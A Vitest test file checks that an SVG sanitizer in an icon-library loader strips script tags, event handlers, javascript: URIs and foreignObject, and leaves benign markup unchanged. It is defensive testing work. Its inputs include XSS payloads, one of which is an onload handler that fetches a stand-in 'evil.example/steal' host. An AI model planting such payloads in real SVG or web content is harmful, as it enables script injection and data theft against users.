import { describe, expect, it } from 'vitest';
import { loadLibrary } from '../../src/libraries/library-loader.js';
import { sanitizeSvgFragment } from '../../src/libraries/svg-sanitizer.js';

/**
 * Security hardening: icon assetRef values ingested via loadLibrary() must not be able to
 * smuggle executable script or event handlers into a diagram's rendered SVG/PNG export.
 */
describe('sanitizeSvgFragment', () => {
  it('strips <script> tags from inline SVG markup', () => {
    const input = '<g><rect/><script>alert(1)</script></g>';
    expect(sanitizeSvgFragment(input)).not.toContain('<script');
    expect(sanitizeSvgFragment(input)).not.toContain('alert');
  });

  it('strips onload/onclick and similar event handler attributes', () => {
    const input = '<rect onload="alert(1)" onclick=\'evil()\' width="10" />';
    const result = sanitizeSvgFragment(input);
    expect(result).not.toMatch(/onload/i);
    expect(result).not.toMatch(/onclick/i);
    expect(result).toContain('width="10"');
  });

  it('neutralizes javascript: URIs in href/xlink:href', () => {
    const input = '<a href="javascript:alert(1)"><rect/></a>';
    expect(sanitizeSvgFragment(input)).not.toContain('javascript:');
  });

  it('strips <foreignObject> (can embed arbitrary HTML/script)', () => {
    const input = '<g><foreignObject><body onload="evil()">hi</body></foreignObject></g>';
    expect(sanitizeSvgFragment(input)).not.toContain('foreignObject');
  });

  it('leaves plain path/URL asset references untouched', () => {
    expect(sanitizeSvgFragment('icons/azure/blob-storage.svg')).toBe('icons/azure/blob-storage.svg');
    expect(sanitizeSvgFragment('shape:rectangle')).toBe('shape:rectangle');
  });

  it('leaves benign inline SVG markup untouched', () => {
    const benign = '<rect x="2" y="2" width="44" height="44" fill="#0078d4" />';
    expect(sanitizeSvgFragment(benign)).toBe(benign);
  });

  it('is applied automatically by loadLibrary()', () => {
    const library = loadLibrary({
      id: 'untrusted',
      version: '1.0.0',
      icons: [
        {
          id: 'evil',
          displayName: 'Evil',
          keywords: [],
          category: 'Test',
          assetRef: '<rect onload="fetch(\'https://evil.example/steal\')" />',
        },
      ],
    });
    expect(library.icons[0].assetRef).not.toMatch(/onload/i);
  });
});
